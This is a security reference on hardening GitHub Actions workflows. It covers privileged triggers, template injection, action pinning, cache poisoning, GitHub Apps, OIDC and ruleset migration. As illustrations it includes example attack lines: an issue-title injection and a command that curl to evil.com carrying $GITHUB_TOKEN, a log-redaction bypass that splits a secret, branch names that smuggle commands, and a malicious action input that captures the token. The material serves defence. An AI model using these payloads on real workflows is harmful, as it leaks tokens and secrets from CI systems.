# Threat Models & Remediation Patterns

Detailed reference for the [gha-hardening](SKILL.md) skill. Threat models follow the [GitHub Security Lab series](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (Parts 1–4).

## Fix table

The Gate runs zizmor with the pedantic persona, offline. Each finding links its rule's documentation; these are the fixes that keep the workflow's behaviour.

| Finding | Fix |
|---|---|
| `unpinned-uses` | `scripts/pin-action.sh <action>@<ref>`; keep the `# vX.Y.Z` comment it prints (`ref-version-mismatch` checks it). Local actions (`./...`) stay as they are. |
| `excessive-permissions`, `undocumented-permissions` | Top-level `permissions: {}`; each job grants what it uses, one comment per grant saying why. |
| `artipacked` | `persist-credentials: false` on every `actions/checkout`. A job that pushes passes its token to that one step (§8). |
| `template-injection` | Move each `${{ }}` out of `run:` (and out of `script:` for `actions/github-script`) into step `env:`, then use `"$VAR"` (§2). |
| `concurrency-limits` | Workflow-level `concurrency:`, group on `${{ github.workflow }}-${{ github.event.pull_request.number \|\| github.ref }}`; `cancel-in-progress: true` except on release and deploy workflows. |
| `anonymous-definition` | `name:` on the workflow and each job. A job `name:` renames its status check. |
| `dangerous-triggers` | Replace `pull_request_target` / `workflow_run` with `pull_request` when no secret is needed; otherwise follow §1 or §4 and propose an ignore with the guard as reason. |
| `secrets-inherit`, `overprovisioned-secrets` | Pass each secret by name; `toJSON(secrets)` never. |
| `cache-poisoning` | No cache restore in release or publish jobs (`enable-cache: false`, no `cache:` input) (§6). |
| `use-trusted-publishing` | PyPI / npm publish through OIDC trusted publishing, then delete the token secret (human step). |
| `github-env` | Write to `$GITHUB_ENV` / `$GITHUB_PATH` only values the workflow builds itself. |
| `bot-conditions`, `unredacted-secrets`, `obfuscation`, `stale-action-refs`, other | Follow the rule's documentation; when the fix would change behaviour, it is a decision for the pull request. |

A strict-collection failure (a file zizmor cannot parse: Jinja or copier templates, test fixtures) cannot be ignored. Move the file out of `.github/` or `action.yml` names (e.g. `action.yml.jinja`), or rename the fixture directory.

## Pitfalls

1. **A job `name:` renames its status check.** Required checks are matched by name; check the "Rules" section of the audit and list the ruleset edit as a human step.
2. **`with:` and template injection.** zizmor flags `with:` inputs that execute code (`actions/github-script`'s `script:`, `azure/cli`'s `inlineScript:`). Move the expression into step `env:` and read it from the script (`process.env.X`). Other inputs (`actions/checkout`'s `repository:`) are safe.
3. **Adding `environment:` to a job** scopes its secrets, and also applies the Environment's required reviewers: every run waits for approval. Check `gh api repos/<owner>/<repo>/environments/<env>` first.
4. **`github.token` cannot bypass rules.** A workflow that pushes to a protected branch needs a GitHub App granted bypass (§8, §10), never a personal access token.
5. **Ruleset bypass actor IDs are the App's ID** (`gh api apps/<slug> --jq .id`), not its installation ID.
6. **OIDC subject claims** contain `ref:`, which differs between branches and tags; some registries (Quay) need the claim customized (§9).

---

## 1. `pull_request_target` — Privileged Code Execution

### Threat

`pull_request_target` runs with **write permissions and secret access**, even for PRs from forks. If the workflow checks out and executes PR code, the attacker gets arbitrary code execution in a privileged context.

### Dangerous Pattern

```yaml
# INSECURE — attacker code runs with secrets + write token
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm install && npm build
```

`npm install` executes attacker-controlled `preinstall`/`postinstall` scripts with full access to secrets and the `GITHUB_TOKEN`.

### Safe Alternatives

**Option A — Use `pull_request` instead (preferred when no privileged access needed):**

```yaml
on: pull_request
# Forks get read-only, no secrets — safe to build and test
```

**Option B — Two-workflow split (when you need privileged post-processing):**

Unprivileged workflow (`build.yml`):
```yaml
on: pull_request
steps:
  - uses: actions/checkout@<sha>
  - run: npm test
  - uses: actions/upload-artifact@<sha>
    with:
      name: results
      path: coverage/
```

Privileged workflow (`comment.yml`):
```yaml
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]
steps:
  - uses: actions/download-artifact@<sha>
  # Process artifacts (DON'T execute them)
```

**Option C — Same-org guard (when only internal PRs need the workflow):**

```yaml
on: pull_request_target
jobs:
  build:
    if: github.event.pull_request.head.repo.owner.login == 'myorg'
```

### TOCTOU Attack

Even with approval labels, attackers can push malicious commits after labeling but before execution. Always checkout by `head.sha`:

```yaml
- uses: actions/checkout@<sha>
  with:
    ref: ${{ github.event.pull_request.head.sha }}  # immutable
    # NOT: ref: ${{ github.event.pull_request.head.ref }}  # mutable branch
```

### Non-Default Branch Vulnerability

Fixes on `main` don't protect other branches. If `release/1.0` still has the vulnerable workflow, attackers can target PRs against that branch. Close or rebase pre-existing PRs after fixing.

---

## 2. Script Injection via `${{ }}` Expressions

### Threat

GitHub evaluates `${{ }}` expressions and substitutes values into the shell script **before** the shell runs. This is template injection — the value becomes part of the script source.

### Dangerous Pattern

```yaml
- run: echo "${{ github.event.issue.title }}"
```

Issue title: `a"; curl http://evil.com?t=$GITHUB_TOKEN;#` → arbitrary command execution.

### Untrusted Context Fields

All of these are attacker-controlled:

- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body` / `.head.ref` / `.head.label`
- `github.event.comment.body` / `github.event.review.body`
- `github.event.commits.*.message`
- `github.event.head_commit.message` / `.author.email` / `.author.name`
- `github.event.pull_request.head.repo.default_branch`
- `github.head_ref`

Branch names like `zzz";echo${IFS}"hello";#` are valid. Email addresses like `` `echo${IFS}hello`@domain.com `` are valid.

### Fix: Intermediate Environment Variables

```yaml
- name: Print title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

The value is stored as a shell variable, not interpolated into the script template. Always double-quote the variable to avoid word splitting.

### `with:` Blocks — It Depends on the Action

Action inputs (`with:`) are passed as arguments, not used to generate shell scripts. However, some actions execute the input as code — these are **code-execution sinks**.

**Known code-execution sinks** (treat like `run:` — use `env:` + script variable):
- `actions/github-script` → `script:`
- `azure/cli` → `inlineScript:`
- `azure/powershell` → `inlineScript:`
- `jannekem/run-python-script-action` → `script:`
- `cardinalby/js-eval-action` → `expression:`

**Non-code-execution inputs** (safe — suppress pedantic findings with justification):

```yaml
- uses: some/action@<sha>
  with:
    title: ${{ github.event.pull_request.title }} # zizmor: ignore[template-injection] not a code-execution sink
```

---

## 3. Supply Chain — Third-Party Actions

### Threat

Any action you `uses:` gets access to compute time, job secrets, and the `GITHUB_TOKEN` (always available, even if not explicitly passed). A malicious action can extract the token via a hidden input default:

```yaml
# Inside the malicious action's action.yml
inputs:
  random_name:
    default: ${{ github.token }}
```

### Tag Mutability

Tags like `@v4` can be moved to point to a different commit at any time. If an action maintainer's account is compromised, the attacker replaces the tag target and every consumer runs the malicious version.

### Reference Safety Hierarchy

| Method | Safety | Notes |
|---|---|---|
| `@main` (branch) | Worst | Mutable, any push changes what runs |
| `@v4` (tag) | Moderate | Mutable, tags can be force-pushed |
| `@<short-sha>` | Bad | Deprecated, collision-vulnerable |
| **`@<full-40-char-sha>`** | **Best** | Immutable; use this |
| Fork the action | Best (with cost) | Full control, but requires manual updates |

Add a comment with the version for human readability:

```yaml
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
```

---

## 4. `workflow_run` Privilege Escalation

### Threat

`workflow_run` grants write permissions and secret access even if the triggering workflow had none. An attacker can submit a PR that modifies the triggering workflow's event list — since `pull_request` workflows run the PR's version, the modified workflow triggers the privileged `workflow_run`.

### Artifact Poisoning

Artifacts uploaded by an untrusted `pull_request` workflow are attacker-controlled. If the `workflow_run` workflow downloads and executes them, the attacker achieves code execution in a privileged context.

### Mitigations

```yaml
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]  # Restrict to main branch only

jobs:
  process:
    if: github.event.workflow_run.event != 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          path: /tmp/artifacts  # Unzip to /tmp, not workspace
      # Validate contents before use
```

Repository owner checks (`github.repository_owner == 'myorg'`) are **NOT effective** — `workflow_run` always runs in the default branch context, which belongs to the org.

---

## 5. `issue_comment` / IssueOps

### Threat

Comment-triggered workflows (`/deploy`, `/approve`) are vulnerable to TOCTOU: an admin comments to approve, the attacker pushes a malicious commit before the workflow checks out.

`issue_comment` bypasses PR approval mechanisms and always runs the default branch workflow — repo checks are useless.

### Ineffective Mitigations

- **Actor checks**: the legitimate admin triggers the workflow, but the attacker controls the code.
- **Date checks**: attackers can forge commit dates.
- **Repo checks**: `issue_comment` always runs in the target repo context.

### Effective Mitigation: Label Gates

```yaml
on:
  pull_request:
    types: [labeled]

jobs:
  deploy:
    if: github.event.label.name == 'ready-to-deploy'
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # immutable
```

Label events include the commit SHA at label-time, closing the TOCTOU window.

---

## 6. Cache Poisoning

### Threat

Even with `permissions: {}`, a workflow can write to the Actions cache. A `pull_request_target` or `pull_request` workflow running attacker code can poison cache entries. When a privileged workflow (e.g., triggered by `push` to `main`) restores from that cache, the attacker achieves code execution in the privileged context.

### Mitigations

- Use immutable cache keys that include lockfile hashes.
- Don't share cache namespaces between privileged and unprivileged workflows.
- Consider `actions/cache/restore` (read-only) in privileged workflows instead of the full `actions/cache` action.

---

## 7. Secret Exfiltration Techniques

Understanding how attackers exfiltrate secrets helps you defend against it:

- **Environment variables**: `printenv` dumps all secrets set via `env:`.
- **Disk**: `actions/checkout` writes the token to `.git/config` unless `persist-credentials: false`. Generated shell scripts containing `${{ secrets.X }}` are on disk.
- **Log bypass**: GitHub redacts secrets in logs, but attackers split them: `echo ${SECRET:0:4}; echo ${SECRET:4:200}`.
- **HTTP exfiltration**: `curl http://evil.com?token=$GITHUB_TOKEN` — the token is valid until the workflow completes.

### Defenses

- Always set `persist-credentials: false` on `actions/checkout`.
- Scope secrets to step-level `env:`, not job/workflow level.
- Use `permissions:` to restrict the `GITHUB_TOKEN` to minimum needed scopes.
- For write tokens: prefer GitHub Apps (short-lived, scoped) over PATs (long-lived, broad).

---

## 8. GitHub App Pattern (Replace PATs)

One App per job that needs more than `github.token`: minimum permissions, installed on the one repository, credentials in an Environment deployable from one branch. `scripts/setup_github_app.py` does all of it through the manifest flow, so the private key never touches disk; with `--bypass-ruleset <id>` it also adds the App as a bypass actor of a repository ruleset.

```bash
python3 scripts/setup_github_app.py --org Giskard-AI --name <repo>-release \
  --repo Giskard-AI/<repo> --permission contents=write \
  --environment release --branch main \
  --client-id-variable RELEASE_APP_CLIENT_ID --private-key-secret RELEASE_APP_PRIVATE_KEY \
  --bypass-ruleset <ruleset-id> --dry-run
```

```yaml
jobs:
  release:
    environment: release
    permissions:
      contents: read # checkout; the App token pushes
    steps:
      - name: Generate release token
        id: app-token
        uses: actions/create-github-app-token@<sha> # vX.Y.Z
        with:
          client-id: ${{ vars.RELEASE_APP_CLIENT_ID }}
          private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
          permission-contents: write

      - uses: actions/checkout@<sha> # vX.Y.Z
        with:
          persist-credentials: false

      - name: Push
        env:
          APP_TOKEN: ${{ steps.app-token.outputs.token }}
          REPO: ${{ github.repository }}
        run: |
          git remote set-url origin "https://x-access-token:${APP_TOKEN}@github.com/${REPO}.git"
          git push origin main
```

The token lives one hour and only in the `env:` of the step that pushes.

---

## 9. OIDC Federation for Container Registries

The principle is the same for all registries: exchange a short-lived GitHub OIDC token for a registry-scoped credential. No static secrets stored.

All approaches require `id-token: write` permission on the job.

### AWS ECR

```yaml
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    role-to-assume: arn:aws:iam::123456789012:role/my-github-actions-role
    aws-region: us-east-1

- uses: aws-actions/amazon-ecr-login@<sha>
```

### GCP Artifact Registry / GCR

```yaml
- uses: google-github-actions/auth@<sha>
  with:
    workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/my-pool/providers/my-provider
    service_account: ci@my-project.iam.gserviceaccount.com

- uses: docker/login-action@<sha>
  with:
    registry: us-docker.pkg.dev
```

### Quay.io (manual token exchange)

```yaml
- name: Get Quay token via OIDC
  id: quay-token
  run: |
    OIDC_TOKEN=$(curl -sS \
      -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=quay.io" | jq -r '.value')
    QUAY_TOKEN=$(curl -sS \
      --user "org+robot:${OIDC_TOKEN}" \
      https://quay.io/oauth2/federation/robot/token | jq -r '.token')
    echo "::add-mask::${QUAY_TOKEN}"
    echo "token=${QUAY_TOKEN}" >> "$GITHUB_OUTPUT"

- uses: docker/login-action@<sha>
  with:
    registry: quay.io
    username: org+robot
    password: ${{ steps.quay-token.outputs.token }}
```

### OIDC Subject Claim Customization

The default GitHub OIDC subject includes `ref:` which differs between branches and tags. Some registries require customizing the claim so it matches regardless of trigger:

```bash
gh api repos/org/repo/actions/oidc/customization/sub \
  -X PUT --input - <<'EOF'
{"use_default": false, "include_claim_keys": ["repo"]}
EOF
```

---

## 10. Repository Rulesets vs. Classic Branch Protection

### The Problem with Classic Branch Protection

Classic branch protection has three separate bypass mechanisms, each covering different rules:

| Setting | What it bypasses |
|---|---|
| Push restrictions ("Restrict who can push") | Who can push directly |
| PR bypass ("Allow specified actors to bypass required pull requests") | PR requirement |
| *(none)* | **Required status checks — no bypass exists** |

This means a GitHub App that pushes release commits (version bumps, changelogs) will be blocked by required status checks even if it has push restriction and PR bypass. The push fails with:

```
remote: error: GH006: Protected branch update failed for refs/heads/main.
remote: - N of N required status checks are expected.
```

### Repository Rulesets Fix This

Repository rulesets support a single `bypass_actors` list that skips **all** rules — including required status checks. This is the only way to let an app push to a branch with required status checks without those checks passing first.

### Migration Procedure

1. **Read the current classic protection in full:**

   ```bash
   gh api repos/<owner>/<repo>/branches/main/protection
   ```

2. **Map each setting to a ruleset rule:**

   | Classic Setting | Ruleset Rule |
   |---|---|
   | Required status checks | `required_status_checks` (copy all `contexts` and `strict` flag) |
   | Required PR reviews | `pull_request` (copy `required_approving_review_count`, `dismiss_stale_reviews`, `require_last_push_approval`, etc.) |
   | Allow force pushes: false | `non_fast_forward` |
   | Allow deletions: false | `deletion` |
   | Block creations: true | `creation` |
   | Push restrictions (apps) | `bypass_actors` with `actor_type: Integration` |
   | PR bypass (apps) | Same `bypass_actors` entry covers this too |

3. **Get the app's database ID** (not the installation ID):

   ```bash
   gh api apps/<app-slug> --jq '.id'
   ```

4. **Create the ruleset** with the app as bypass actor. See Step 4c in SKILL.md for the full API call.

5. **Verify the ruleset** is active and correct:

   ```bash
   gh api repos/<owner>/<repo>/rulesets/<id> --jq '{
     name, enforcement,
     bypass: [.bypass_actors[] | {actor_type, actor_id, bypass_mode}],
     rules: [.rules[].type],
     checks: [.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context]
   }'
   ```

6. **Delete classic protection only after verification:**

   ```bash
   gh api repos/<owner>/<repo>/branches/main/protection -X DELETE
   ```

### Gotchas

- The `actor_id` for `Integration` type is the **app's global database ID** (`gh api apps/<slug> --jq '.id'`), not the installation ID. Using the installation ID produces: "Actor integration must be part of the ruleset source or owner organization".
- Some `pull_request` rule parameters may not be supported in rulesets (e.g., `automatic_copilot_code_review_enabled`). If the API returns a validation error, remove the unsupported parameter and retry.
- Classic protection and rulesets can coexist — both are enforced. Delete classic protection only after confirming the ruleset covers everything, to avoid a window with no protection.
- After deleting classic protection, `gh api repos/<owner>/<repo>/branches/main/protection` returns 404 — this is expected. The ruleset is the active protection.

---

## Sources

- [Part 1: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [Part 3: How to trust your building blocks](https://securitylab.github.com/research/github-actions-building-blocks/)
- [Part 4: New patterns and mitigations](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/)
